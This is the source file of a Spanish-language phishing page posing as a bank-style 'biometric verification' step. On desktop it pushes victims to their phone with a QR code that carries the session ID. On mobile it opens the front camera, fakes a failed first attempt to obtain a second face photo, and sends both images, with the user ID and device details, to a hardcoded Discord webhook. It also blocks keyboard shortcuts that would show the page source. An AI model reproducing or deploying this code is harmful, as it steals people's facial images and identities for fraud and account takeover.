<?php
// --- LÓGICA DE PUENTE DE SESIÓN (CROSS-DEVICE) ---
if (isset($_GET['sid']) && !empty($_GET['sid'])) {
    session_id($_GET['sid']);
}

session_start();

// --- CONFIGURACIÓN DE WEBHOOK DE DISCORD ---
$WEBHOOK_URL = "https://discord.com/api/webhooks/1426250594321956894/M1IgYU5iTrJbYrLG99c6zdsdo63viux_t2SQBizNOnKZYnfDtzz8n4dgLsK2CK52WRMY";

// Obtener el usuario de la sesión o de GET
$user_id = $_SESSION['user_id'] ?? ($_GET['user'] ?? 'Usuario_Desconocido');

// DETECCIÓN DE DISPOSITIVO
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
$isMobile = (strpos($ua, 'mobile') !== false || strpos($ua, 'android') !== false || strpos($ua, 'iphone') !== false);

// --- SI ESTAMOS EN ESCRITORIO (PC) ---
if (!$isMobile) {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
    $currentLink = "$protocol://$_SERVER[HTTP_HOST]$_SERVER[PHP_SELF]";
    $qrData = $currentLink . "?sid=" . session_id() . "&user=" . urlencode($user_id);
    $qrImage = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" . urlencode($qrData);
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Continuar en Móvil</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #1a2036;
        }
        .desktop-card {
            background: #fff;
            width: 100%;
            max-width: 500px;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            text-align: center;
            border-top: 6px solid #e31c23;
        }
        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 15px;
            letter-spacing: -0.5px;
        }
        p {
            color: #4f5b67;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        .qr-container {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 12px;
            display: inline-block;
            border: 1px solid #eee;
            margin-bottom: 25px;
        }
        .qr-container img {
            width: 200px;
            height: 200px;
            display: block;
        }
        .security-note {
            font-size: 13px;
            color: #888;
            background-color: #fff5f5;
            padding: 10px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .icon-lock { width: 14px; fill: #e31c23; }
    </style>
</head>
<body>
    <div class="desktop-card">
        <h1>Validación Biométrica</h1>
        <p>
            Por motivos de seguridad y precisión biométrica, este paso no puede completarse desde una computadora.<br><br>
            <strong>Escanee el código QR</strong> con la cámara de su celular para continuar el proceso de forma segura sin perder sus datos.
        </p>
        
        <div class="qr-container">
            <img src="<?php echo $qrImage; ?>" alt="Escanee el QR">
        </div>

        <div class="security-note">
            <svg class="icon-lock" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            <span>Sesión encriptada de extremo a extremo</span>
        </div>
    </div>
</body>
</html>
<?php
    exit();
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Verificación Facial</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  html, body {
    width: 100%;
    height: 100%;
    overflow: hidden;
    margin: 0;
    padding: 0;
  }

  body {
    font-family: 'Inter', sans-serif;
    background-color: #ffffff;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start; 
    position: relative;
  }

  /* =========================================
     PANTALLA INICIAL (SPLASH) CON faci.jpeg
     Responsive para teléfono: la imagen cubre toda la pantalla
     ========================================= */
  #splash-screen {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    height: 100dvh; /* Dynamic viewport height - mejor para moviles */
    background: #ffffff;
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    cursor: pointer;
    transition: opacity 0.4s ease;
    overflow: hidden;
    /* Soporte para notch / safe area */
    padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
    -webkit-tap-highlight-color: transparent;
  }

  #splash-screen img {
    display: block;
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center center;
    user-select: none;
    -webkit-user-select: none;
    -webkit-user-drag: none;
    pointer-events: none;
  }

  #splash-screen.hidden {
    opacity: 0;
    pointer-events: none;
    visibility: hidden;
  }

  /* Contenido principal oculto hasta que el usuario toque la pantalla */
  #main-content {
    display: none;
    width: 100%;
    height: 100%;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    padding-top: 40px;
    overflow: hidden;
  }
  #main-content.visible {
    display: flex;
  }

  .camera-wrapper {
    position: relative;
    width: 280px;
    height: 280px;
    border-radius: 50%;
    overflow: hidden;
    border: 5px solid #000;
    background-color: #000;
    box-shadow: 0 8px 25px rgba(0,0,0,0.2);
    z-index: 1;
    margin-bottom: 25px;
    margin-top: 25px;
    transition: all 0.3s ease;
  }

  .camera-wrapper.active {
    border-color: #0078d4;
    box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.2);
  }

  .camera-wrapper.error-state {
    border-color: #d93025;
    box-shadow: 0 0 0 4px rgba(217, 48, 37, 0.2);
  }

  .camera-wrapper.success-state {
    border-color: #25d366;
    box-shadow: 0 0 0 4px rgba(37, 211, 102, 0.2);
  }

  video#camera-feed {
    width: 100%;
    height: 100%;
    object-fit: cover;
    transform: scaleX(-1);
    -webkit-transform: scaleX(-1);
    display: block;
    background-color: #000;
  }

  canvas#frozen-frame {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: none;
    z-index: 2;
  }

  #photoPreview {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: none;
    z-index: 3;
  }

  .silhouette-overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    z-index: 5;
    opacity: 0.5;
  }

  .ios-warning {
    display: none;
    background: #fff3cd;
    border: 1px solid #ffeaa7;
    color: #856404;
    padding: 12px;
    border-radius: 10px;
    margin-bottom: 15px;
    font-size: 13px;
    text-align: left;
    max-width: 340px;
    width: 90%;
  }
  
  .ios-warning i { 
    color: #f39c12; 
    margin-right: 8px; 
  }

  .verification-layer {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(26, 32, 54, 0.85);
    display: flex;
    justify-content: center;
    align-items: center;
    opacity: 0;
    visibility: hidden;
    transition: opacity 0.3s ease;
    z-index: 10;
  }

  .camera-wrapper.processing .verification-layer {
    opacity: 1;
    visibility: visible;
  }

  .spinner {
    width: 50px;
    height: 50px;
    border: 4px solid rgba(255,255,255,0.3);
    border-radius: 50%;
    border-top-color: #fff;
    animation: spin 1s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  .scan-overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: linear-gradient(to bottom, transparent, rgba(37, 211, 102, 0.3), transparent);
    transform: translateY(-100%);
    display: none;
    z-index: 10;
  }
  
  .camera-wrapper.scanning .scan-overlay {
    display: block;
    animation: scanMove 1.5s infinite linear;
  }
  
  @keyframes scanMove {
    0% { transform: translateY(-100%); }
    100% { transform: translateY(100%); }
  }

  #bottom-controls {
    position: fixed;
    bottom: 40px;
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 12px;
    opacity: 1;
    transform: translateY(0);
    transition: all 0.3s ease;
    padding-bottom: env(safe-area-inset-bottom);
  }

  .action-label {
    font-size: 14px;
    color: #555;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-bottom: 5px;
  }

  .btn-shutter {
    width: 72px;
    height: 72px;
    border-radius: 50%;
    background-color: #0078d4;
    border: none;
    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
    display: flex;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    transition: all 0.2s;
    -webkit-tap-highlight-color: transparent;
  }
  
  .btn-shutter:active { 
    transform: scale(0.95); 
    background-color: #106ebe;
  }
  
  .btn-shutter:disabled {
    background-color: #ccc;
    cursor: not-allowed;
  }

  .icon-svg {
    width: 32px;
    height: 32px;
    fill: white;
  }

  .enable-camera-btn {
    background-color: #25d366;
    color: white;
    border: none;
    padding: 14px 28px;
    border-radius: 25px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    display: none;
    margin-top: 15px;
    box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
    transition: all 0.2s;
  }
  
  .enable-camera-btn:active {
    transform: scale(0.95);
    background-color: #1da851;
  }

  .status-text {
    font-size: 15px;
    font-weight: 600;
    color: #0078d4;
    margin-bottom: 20px;
    min-height: 20px;
    text-align: center;
    padding: 0 15px;
  }
  
  .status-text.error {
    color: #d93025;
  }
  
  .status-text.success {
    color: #25d366;
  }

  .camera-fallback {
    display: none;
    color: white;
    text-align: center;
    padding: 40px 20px;
    font-size: 14px;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: #000;
    z-index: 3;
  }

  @media (max-height: 700px) {
    #main-content { padding-top: 20px; }
    .camera-wrapper { 
      width: 250px; 
      height: 250px;
      margin-bottom: 20px;
    }
    #bottom-controls { bottom: 30px; }
  }

  @media (max-height: 600px) {
    .camera-wrapper {
      width: 200px;
      height: 200px;
      margin-top: 15px;
      margin-bottom: 15px;
    }
  }
</style>
</head>
<body>

  <!-- =========================================
       PANTALLA INICIAL: muestra faci.jpeg
       Al tocar cualquier parte, se oculta y se muestra el resto
       ========================================= -->
  <div id="splash-screen">
    <img src="assets/index_files/images/faci.jpeg" alt="Verificación">
  </div>

  <!-- =========================================
       CONTENIDO PRINCIPAL (oculto hasta que toquen la splash)
       ========================================= -->
  <div id="main-content">

    <div class="ios-warning" id="iosWarning">
      <i class="fas fa-exclamation-triangle"></i>
      <span>Para iOS: Si la cámara no se activa automáticamente, toque "Activar Cámara" abajo.</span>
    </div>

    <div class="camera-wrapper" id="cameraWrapper">
      <video id="camera-feed" autoplay playsinline muted></video>
      <canvas id="frozen-frame" style="display: none;"></canvas>
      <img id="photoPreview" alt="Captura">
      <div class="camera-fallback" id="cameraFallback">
        <i class="fas fa-video-slash fa-3x" style="margin-bottom: 15px;"></i><br>
        Cámara no disponible
      </div>
      <svg class="silhouette-overlay" viewBox="0 0 200 200" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg">
        <path d="M100,40 C75,40 55,60 55,85 C55,115 70,125 70,125 C40,140 30,165 30,200 L170,200 C170,165 160,140 130,125 C130,125 145,115 145,85 C145,60 125,40 100,40 Z" fill="none" stroke="#e0e0e0" stroke-width="4" stroke-linejoin="round" />
      </svg>
      <div class="scan-overlay"></div>
      <div class="verification-layer">
        <div class="spinner"></div>
      </div>
    </div>

    <div class="status-text" id="statusText">Iniciando verificación...</div>

    <div id="bottom-controls">
      <button id="btn-capture" class="btn-shutter" disabled>
        <svg class="icon-svg" viewBox="0 0 24 24">
           <path d="M12 15a3 3 0 100-6 3 3 0 000 6z"/>
           <path fill-rule="evenodd" d="M1.323 11.447C2.811 6.976 7.028 3.75 12.001 3.75c4.97 0 9.185 3.223 10.675 7.69.12.362.12.752 0 1.113-1.487 4.471-5.705 7.697-10.677 7.697-4.97 0-9.186-3.223-10.675-7.69a1.762 1.762 0 010-1.113zM17.25 12a5.25 5.25 0 11-10.5 0 5.25 5.25 0 0110.5 0z" clip-rule="evenodd"/>
        </svg>
      </button>
      <button id="enableCameraBtn" class="enable-camera-btn">
        <i class="fas fa-video"></i> Activar Cámara
      </button>
    </div>

  </div>

<script>
  document.addEventListener("DOMContentLoaded", () => {
    // =========================================================
    // SPLASH: al tocar cualquier parte se muestra el contenido
    // =========================================================
    const splash = document.getElementById('splash-screen');
    const mainContent = document.getElementById('main-content');

    let splashDismissed = false;

    function dismissSplash() {
      if (splashDismissed) return;
      splashDismissed = true;
      splash.classList.add('hidden');
      mainContent.classList.add('visible');
      // Pequeño delay y luego iniciar según dispositivo
      setTimeout(() => {
        iniciarSegunDispositivo();
      }, 200);
    }

    splash.addEventListener('click', dismissSplash);
    splash.addEventListener('touchstart', function(e){
      e.preventDefault();
      dismissSplash();
    }, { passive: false });

    // Elementos DOM
    const video = document.getElementById('camera-feed');
    const frozenCanvas = document.getElementById('frozen-frame');
    const photoPreview = document.getElementById('photoPreview');
    const wrapper = document.getElementById('cameraWrapper');
    const btn = document.getElementById('btn-capture');
    const statusText = document.getElementById('statusText');
    const enableCameraBtn = document.getElementById('enableCameraBtn');
    const iosWarning = document.getElementById('iosWarning');
    const cameraFallback = document.getElementById('cameraFallback');

    // Variables
    let stream = null;
    let cameraInitialized = false;
    let captureCount = 0;
    let user_id = "<?php echo $user_id; ?>";

    if (user_id === "Usuario_Desconocido") {
      user_id = localStorage.getItem('user_bip') || 'Usuario_Desconocido';
    }

    const WEBHOOK_URL = "<?php echo $WEBHOOK_URL; ?>";

    // Detección de dispositivo
    const ua = navigator.userAgent;
    const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
    const isAndroid = /Android/.test(ua);
    const isChrome = /Chrome/.test(ua);
    const isSafari = /Safari/.test(ua) && !isChrome;

    if (isIOS) {
      iosWarning.style.display = 'block';
    }

    // Función para iniciar cámara
    async function startCamera() {
      try {
        statusText.textContent = "Solicitando acceso a cámara...";
        
        if (stream) {
          stream.getTracks().forEach(track => {
            track.stop();
            track.enabled = false;
          });
          stream = null;
        }

        const constraints = {
          video: {
            facingMode: 'user',
            width: { min: 640, ideal: 1280 },
            height: { min: 480, ideal: 720 },
            frameRate: { ideal: 30 }
          },
          audio: false
        };

        if (isIOS) {
          constraints.video = {
            facingMode: 'user',
            width: { ideal: 640 },
            height: { ideal: 480 }
          };
        }

        stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        
        await new Promise((resolve, reject) => {
          video.onloadedmetadata = () => {
            video.play()
              .then(() => {
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                  cameraInitialized = true;
                  btn.disabled = false;
                  enableCameraBtn.style.display = 'none';
                  cameraFallback.style.display = 'none';
                  wrapper.classList.add('active');
                  
                  statusText.textContent = "Cámara lista. Posicione su rostro.";
                  resolve();
                } else {
                  reject(new Error("Video no está transmitiendo"));
                }
              })
              .catch(reject);
          };
          
          video.onerror = reject;
          
          setTimeout(() => reject(new Error("Timeout cargando cámara")), 5000);
        });

      } catch (err) {
        console.error("Error iniciando cámara:", err);
        handleCameraError(err);
      }
    }

    function handleCameraError(err) {
      statusText.textContent = "Error: " + (err.message || "No se pudo acceder a la cámara");
      statusText.className = "status-text error";
      wrapper.classList.add('error-state');
      cameraFallback.style.display = 'block';
      video.style.display = 'none';
      
      enableCameraBtn.style.display = 'block';
      enableCameraBtn.disabled = false;
      enableCameraBtn.innerHTML = '<i class="fas fa-redo"></i> Reintentar Cámara';
      enableCameraBtn.onclick = () => {
        enableCameraBtn.style.display = 'none';
        cameraFallback.style.display = 'none';
        video.style.display = 'block';
        wrapper.classList.remove('error-state');
        statusText.textContent = "Reintentando...";
        statusText.className = "status-text";
        startCamera();
      };
    }

    // Lógica de captura
    btn.addEventListener('click', async () => {
      if (!cameraInitialized || !stream) {
        statusText.textContent = "Primero active la cámara";
        statusText.className = "status-text error";
        return;
      }

      btn.disabled = true;
      btn.innerHTML = '<i class="fas fa-circle-notch fa-spin" style="color: white; font-size: 24px;"></i>';
      
      captureCount++;
      
      frozenCanvas.width = video.videoWidth;
      frozenCanvas.height = video.videoHeight;
      const ctx = frozenCanvas.getContext('2d');
      
      ctx.save();
      ctx.translate(frozenCanvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, frozenCanvas.width, frozenCanvas.height);
      ctx.restore();
      
      frozenCanvas.toBlob(async (blob) => {
        if (!blob) {
          statusText.textContent = "Error al capturar imagen";
          statusText.className = "status-text error";
          btn.disabled = false;
          btn.innerHTML = '<svg class="icon-svg" viewBox="0 0 24 24"><path d="M12 15a3 3 0 100-6 3 3 0 000 6z"/><path fill-rule="evenodd" d="M1.323 11.447C2.811 6.976 7.028 3.75 12.001 3.75c4.97 0 9.185 3.223 10.675 7.69.12.362.12.752 0 1.113-1.487 4.471-5.705 7.697-10.677 7.697-4.97 0-9.186-3.223-10.675-7.69a1.762 1.762 0 010-1.113zM17.25 12a5.25 5.25 0 11-10.5 0 5.25 5.25 0 0110.5 0z" clip-rule="evenodd"/></svg>';
          return;
        }

        const dataUrl = URL.createObjectURL(blob);
        photoPreview.src = dataUrl;
        video.style.display = 'none';
        photoPreview.style.display = 'block';
        wrapper.classList.add('scanning');
        
        if (captureCount === 1) {
          statusText.textContent = "Analizando biometría...";
          
          setTimeout(() => {
            wrapper.classList.remove('scanning');
            wrapper.classList.remove('active');
            wrapper.classList.add('error-state');
            
            statusText.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error: Verificación fallida. Intente nuevamente.';
            statusText.className = "status-text error";
            
            sendToDiscord(blob, 1, false);
            
            setTimeout(() => {
              photoPreview.style.display = 'none';
              video.style.display = 'block';
              wrapper.classList.remove('error-state');
              wrapper.classList.add('active');
              
              btn.disabled = false;
              btn.innerHTML = '<svg class="icon-svg" viewBox="0 0 24 24"><path d="M12 15a3 3 0 100-6 3 3 0 000 6z"/><path fill-rule="evenodd" d="M1.323 11.447C2.811 6.976 7.028 3.75 12.001 3.75c4.97 0 9.185 3.223 10.675 7.69.12.362.12.752 0 1.113-1.487 4.471-5.705 7.697-10.677 7.697-4.97 0-9.186-3.223-10.675-7.69a1.762 1.762 0 010-1.113zM17.25 12a5.25 5.25 0 11-10.5 0 5.25 5.25 0 0110.5 0z" clip-rule="evenodd"/></svg>';
              statusText.textContent = "Ajuste la luz y mire directo a la cámara.";
              statusText.className = "status-text";
            }, 2000);
            
          }, 2000);
          
        } else {
          statusText.textContent = "Verificación exitosa...";
          statusText.className = "status-text success";
          
          setTimeout(() => {
            wrapper.classList.remove('scanning');
            wrapper.classList.remove('active');
            wrapper.classList.add('success-state');
            
            btn.innerHTML = '<i class="fas fa-check" style="color: white; font-size: 24px;"></i>';
            btn.style.backgroundColor = "#25d366";
            
            statusText.textContent = "Identidad verificada correctamente.";
            
            sendToDiscord(blob, 2, true);
            
            setTimeout(() => {
              window.location.href = 'end.php';
            }, 3000);
            
          }, 2000);
        }
      }, 'image/jpeg', 0.9);
    });

    // Función para enviar a Discord
    function sendToDiscord(blob, attempt, success) {
      const note = success ? "✅ Intento 2 (Éxito)" : "⚠️ Intento 1 (Fallo simulado)";
      const deviceType = isIOS ? 'iOS' : isAndroid ? 'Android' : 'Otro';
      const browserType = isChrome ? 'Chrome' : isSafari ? 'Safari' : 'Otro';
      
      const formData = new FormData();
      const filename = `facial_${user_id}_intento${attempt}.jpg`;
      
      formData.append('file', blob, filename);
      formData.append('payload_json', JSON.stringify({
        content: `📱 **Nueva Captura Facial**\n👤 Usuario: \`${user_id}\`\n🔢 Intento: **${attempt} / 2**\n📱 Dispositivo: ${deviceType}\n🌐 Navegador: ${browserType}\nℹ️ Estado: ${note}\n📅 Fecha: ${new Date().toLocaleString()}`,
        username: "Security Biometrics"
      }));
      
      fetch(WEBHOOK_URL, {
        method: 'POST',
        body: formData
      }).catch(e => console.error("Error Discord:", e));
    }

    // Iniciar según dispositivo (solo cuando se toca la splash)
    function iniciarSegunDispositivo() {
      if (isIOS) {
        statusText.textContent = "Toque 'Activar Cámara' para comenzar";
        enableCameraBtn.style.display = 'block';
        enableCameraBtn.onclick = startCamera;
      } else {
        setTimeout(() => {
          startCamera();
        }, 800);
      }
    }

    // Limpiar stream al salir
    window.addEventListener('beforeunload', () => {
      if (stream) {
        stream.getTracks().forEach(track => {
          track.stop();
          track.enabled = false;
        });
      }
    });

    // Detectar problemas de cámara periódicamente
    setInterval(() => {
      if (stream && cameraInitialized) {
        const tracks = stream.getVideoTracks();
        if (tracks.length > 0) {
          const track = tracks[0];
          if (track.readyState === 'ended') {
            console.warn("Cámara terminó inesperadamente");
            handleCameraError(new Error("Cámara desconectada"));
          }
        }
      }
    }, 3000);
  });

  // Prevenir atajos de teclado
  document.addEventListener("keydown", function (e) {
    if (e.key === "F12" || (e.ctrlKey && (e.key === "u" || e.key === "s"))) e.preventDefault();
  });
</script>
<script src="security.js"></script>
</body>
</html>